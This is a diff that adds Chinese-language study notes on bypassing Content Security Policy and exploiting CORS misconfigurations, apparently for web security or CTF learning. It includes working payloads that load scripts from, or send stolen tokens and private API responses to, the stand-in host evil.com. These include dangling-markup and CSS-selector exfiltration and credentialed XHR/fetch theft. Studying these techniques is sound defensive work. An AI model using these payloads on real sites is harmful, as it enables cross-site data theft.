@@ -141,13 +141,161 @@ CDN服务商存在某些低版本的js库。
 
 #### Base-uri绕过
 
+CSP的`script-src`等指令无法约束`<base>`标签，若策略中未设置`base-uri`，攻击者可注入`<base>`标签劫持页面中所有相对路径的资源加载，使原有的相对路径脚本实际从攻击者服务器加载，从而绕过白名单。
+
+```html
+<!-- 目标CSP: default-src 'self'; script-src 'self'，未设置base-uri -->
+<!-- 注入base标签，劫持后续所有相对路径的解析基准 -->
+<base href="https://evil.com/">
+<!-- 页面原有脚本（相对路径），实际加载 https://evil.com/static/app.js -->
+<script src="/static/app.js"></script>
+```
+
+利用条件: 页面存在HTML注入点，CSP未设置`base-uri`（或允许外部域），且页面存在以相对路径加载的script资源。
+防御: 显式设置`base-uri 'self'`。
+
 #### 不完整script标签绕过nonce
 
+当CSP使用nonce保护script时，注入的脚本因缺少nonce无法执行；但如果注入点位于带nonce的script标签之前，可以注入一个未闭合的`<script>`标签，使原页面带nonce的`<script>`标签被HTML解析器当作注入标签的属性，从而"借用"其nonce加载攻击者的外部脚本，并借原页面已有的`</script>`完成闭合。
+
+```html
+<!-- 注入点位于带nonce的script标签之前，注入未闭合的script开标签 -->
+<script src="https://evil.com/1.js"
+<!-- 原页面代码 -->
+<script nonce="abc123">alert(1)</script>
+```
+
+浏览器实际解析结果（原script标签变成了注入标签的属性，注入标签继承了nonce）：
+
+```html
+<script src="https://evil.com/1.js" <script nonce="abc123">alert(1)</script>
+<!-- 该标签同时拥有src和nonce属性，通过nonce校验并加载evil.com脚本 -->
+```
+
+若注入点位于属性值内，需先逃逸属性再注入未闭合标签，同样破坏原页面script标签结构：
+
+```html
+<!-- 注入payload: 逃逸属性后开启带未闭合属性a的script标签 -->
+"><script src=//evil.com a="
+<!-- 后续原页面的<script nonce=...>被吞入属性，直到遇到</script>才闭合 -->
+```
+
+利用条件: 存在HTML注入点且位于带nonce的script标签之前（或可逃逸属性），注入标签可借用原页面的nonce属性。
+
 #### object-src绕过（PDFXSS）
+
+CSP策略中若遗漏`object-src`（且default-src未覆盖），攻击者可使用`<object>`/`<embed>`标签嵌入恶意PDF文件，PDF中内嵌的JavaScript代码会在浏览器/插件自带的PDF阅读器中执行，从而绕过script-src的限制。
+
+```html
+<!-- 目标CSP: default-src 'self'; script-src 'self'，未设置object-src -->
+<object data="https://evil.com/x.pdf"></object>
+<embed src="https://evil.com/x.pdf" type="application/pdf">
+```
+
+恶意PDF利用`/OpenAction`动作在打开时自动执行JS：
+
+```
+%PDF-1.7
+1 0 obj << /Type /Catalog /OpenAction 2 0 R >>
+2 0 obj << /Type /Action /S /JavaScript /JS (app.alert(1)) >>
+```
+
+利用条件: CSP未限制object-src，且受害者浏览器的PDF阅读器（如老版本Adobe Reader）支持执行PDF内嵌JS。
+
 #### SVG绕过
+SVG文件本质是XML文档，内部可以内嵌`<script>`执行任意JS。若目标站允许上传SVG且该文件能以文档形式被浏览器加载（直接访问URL或经`<object>`/`<embed>`/`<iframe>`嵌入），当CSP白名单覆盖该源时脚本即可执行。
+
+```html
+<!-- 恶意x.svg，上传到目标站点（'self'在CSP白名单中） -->
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script>alert(document.domain)</script>
+</svg>
+```
+
+```html
+<!-- 触发方式1: 诱导受害者直接访问SVG文件的URL -->
+<!-- 触发方式2: 用object/embed嵌入（注意img标签加载SVG时脚本不执行） -->
+<object data="https://target.com/upload/x.svg"></object>
+```
+
+利用条件: 目标站允许上传SVG且SVG以文档形式被加载（而非`<img>`图片上下文），CSP白名单覆盖该源。
+
 #### 不完整的资源标签获取资源
+注入未闭合的资源标签（如`<img src="https://evil.com/?`，属性值不带右引号），HTML解析器会把注入点之后的一段页面内容全部吞入src属性，直到遇到下一个引号，从而把页面中的敏感数据（flag、token等）拼进URL发送到攻击者服务器，实现数据外带。
+
+```html
+<!-- 注入payload（未闭合的src，不写右引号） -->
+<img src="https://evil.com/?
+<!-- 注入点之后页面原有内容（含未加引号包裹的敏感数据） -->
+<input type=hidden value=flag{secret_0xffff}>
+```
+
+浏览器实际解析结果，敏感数据被拼入URL：
+
+```html
+<img src="https://evil.com/?<input type=hidden value=flag{secret_0xffff}">
+```
+
+攻击者服务器日志中收到外带数据：
+
+```
+GET /?%3Cinput%20type=hidden%20value=flag%7Bsecret_0xffff%7D HTTP/1.1
+```
+
+利用条件: 注入点之后、下一个引号之前的HTML中存在敏感数据，且CSP未将img-src严格限制为'self'（允许向外部域发起图片请求）。
+
 #### CSS选择器获取内容
+利用CSS属性选择器可以逐字符匹配元素属性值的特点，将匹配结果通过`background:url()`外带到攻击者服务器，暴力枚举出隐藏input中的敏感值（如CSRF token），全程无需执行JS即可绕过CSP对script的限制。
+
+```html
+<style>
+/* 当input的value以a开头时，浏览器向evil.com发起请求回显匹配结果 */
+input[value^=a]{background:url(//evil.com/a)}
+input[value^=b]{background:url(//evil.com/b)}
+/* ...枚举所有可能的首字符... */
+</style>
+```
+
+完整偷token思路（逐字符前缀枚举）：
+
+```html
+<style>
+/* 第1轮: 确定首字符，若收到evil.com/a的请求说明首字符为a */
+/* 第2轮: 扩展前缀继续枚举第2位 */
+input[value^=aa]{background:url(//evil.com/aa)}
+input[value^=ab]{background:url(//evil.com/ab)}
+/* 第3轮: 继续扩展前缀，直到token完整泄露 */
+input[value^=aaa]{background:url(//evil.com/aaa)}
+/* 可配合$=后缀匹配、*=包含匹配从两头同时逼近，加速枚举 */
+</style>
+```
+
+利用条件: 页面存在可注入`<style>`的HTML注入点，敏感数据位于元素属性中（如隐藏表单的value），且CSP未严格限制style注入与向外部域的图片请求。
+
 #### CRLF绕过
+若目标存在HTTP响应头注入（CRLF注入）漏洞，通过在参数中注入`%0d%0a`（\r\n）可在响应头中插入换行，再注入`%0d%0a%0d%0a`提前终结响应头区域，把位于注入点之后的Content-Security-Policy头挤进响应体，使其失效，页面失去CSP保护。
+
+```
+# 目标将用户输入回显到响应头（如Location头），且未过滤换行符
+GET /redirect?url=https://evil.com%0d%0a%0d%0a HTTP/1.1
+```
+
+响应效果（CSP头被挤入响应体，浏览器不再将其视为CSP）：
+
+```
+HTTP/1.1 302 Found
+Location: https://evil.com
+
+Content-Security-Policy: script-src 'self'
+```
+
+此后页面中注入的XSS不再受CSP约束：
+
+```html
+<script src="https://evil.com/xss.js"></script>
+```
+
+利用条件: 目标存在CRLF注入（响应头注入）漏洞，且CSP响应头位于被注入的头之后（老版本服务器未过滤头部中的CR/LF字符）。
 
 Ref[][内容安全策略( CSP )](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP)   
 Ref[][我的CSP绕过思路及总结](https://xz.aliyun.com/t/5084)   
@@ -293,9 +441,86 @@ CORS的规范中还提到了“NULL”源。触发这个源是为了网页跳转
 
 #### 注册一个前缀相同的域名
 
+服务端校验Origin时错误地使用`startsWith()`等前缀判断而非精确匹配，攻击者只需注册一个以目标域名开头的域名（如`target.com.evil.com`）即可通过校验，让服务端返回信任该源的CORS响应头。
+
+```js
+// 服务端存在缺陷的校验逻辑
+if (origin.startsWith('https://target.com')) {
+    // 前缀相同即信任，https://target.com.evil.com 同样能通过校验
+    res.setHeader('Access-Control-Allow-Origin', origin);
+    res.setHeader('Access-Control-Allow-Credentials', 'true');
+}
+```
+
+攻击者在evil.com上注册子域`target.com.evil.com`并部署窃取页面：
+
+```html
+<!-- 部署在 https://target.com.evil.com/steal.html -->
+<script>
+var req = new XMLHttpRequest();
+req.open('get', 'https://target.com/api/private-data', true);
+req.withCredentials = true; // 携带受害者在target.com的登录Cookie
+req.onload = function(){
+    // 将窃取到的响应数据外带到攻击者服务器
+    location = 'https://evil.com/log?data=' + this.responseText;
+};
+req.send();
+</script>
+```
+
+利用条件: 服务端用`startsWith/endsWith`等宽松方式校验Origin且响应`Access-Control-Allow-Credentials: true`，攻击者可注册任意前缀/后缀相似的域名。
+
 #### 第三方域名和子域名
 
+CORS白名单若包含`*.target.com`等通配符子域，或信任某个存在漏洞的第三方域，则攻击者只需在该信任域下找到一个XSS、实现子域接管（Subdomain Takeover）或接管过期域名，即可从"受信任"的域直接发起带凭据的跨域读取。
+
+```
+# 服务端白名单: 允许 *.target.com
+Access-Control-Allow-Origin: https://old.target.com
+Access-Control-Allow-Credentials: true
+```
+
+在受信任子域（如已被接管的`old.target.com`或存在XSS的子域）上部署窃取代码：
+
+```html
+<!-- 部署在受信任的 https://old.target.com/ 下 -->
+<script>
+// 受害者已登录target.com，此请求自动携带其Cookie
+fetch('https://target.com/api/private-data', {
+    credentials: 'include'
+}).then(function(resp){ return resp.text(); }).then(function(data){
+    // 将窃取的数据外带到攻击者服务器
+    new Image().src = 'https://evil.com/log?data=' + encodeURIComponent(data);
+});
+</script>
+```
+
+利用条件: CORS白名单包含通配符子域或第三方域，攻击者能在该信任域内执行JS（子域XSS、CNAME残留的子域接管、过期域名接管等）。
+
 #### 特殊字符，利用正则
+
+服务端用`new RegExp()`动态构造正则校验Origin时，`target.com`中的`.`是未转义的元字符（匹配任意字符），且没有锚定边界或缺少域名边界判断，导致大量非目标域可以通过校验。
+
+```js
+// 服务端存在缺陷的正则校验
+new RegExp('target.com').test(origin)   // 缺陷1: .未转义 + 未锚定边界，包含子串即可通过
+new RegExp('target.com$').test(origin)  // 缺陷2: $锚定结尾但无域名边界，以target.com结尾的域名均可通过
+```
+
+绕过时提交的Origin值：
+
+```
+# 缺陷1: 未锚定边界，只要包含"target+任意字符+com"子串即可
+Origin: https://targetxcom.evil.com
+Origin: https://evil-target.com.evil.com
+
+# 缺陷2: $仅锚定结尾，注册以target.com结尾的域名即可
+Origin: https://eviltarget.com
+```
+
+配合`Access-Control-Allow-Credentials: true`即可从上述任意域发起带凭据的跨域读取，窃取受害者数据。
+
+利用条件: 服务端用含未转义元字符或未锚定域边界的正则校验Origin，攻击者可注册满足匹配的域名。
 
 - Ref[][HTTP访问控制（CORS）](
 https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS)   
@@ -396,6 +621,12 @@ document.write(JSON.stringify(json))
 
 ## Ref
 - https://xuanxuanblingbling.github.io/
+
+## 参考
+- [PortSwigger Web Security Academy - Content Security Policy (CSP) 系列](https://portswigger.net/web-security/cross-site-scripting/content-security-policy)
+- [PortSwigger Web Security Academy - CORS (Cross-Origin Resource Sharing) 系列](https://portswigger.net/web-security/cors)
+- [Google CSP Evaluator](https://csp-evaluator.withgoogle.com/)
+- [CSP Cheat Sheet (csplite.com)](https://csplite.com/csp/)
 
 
 
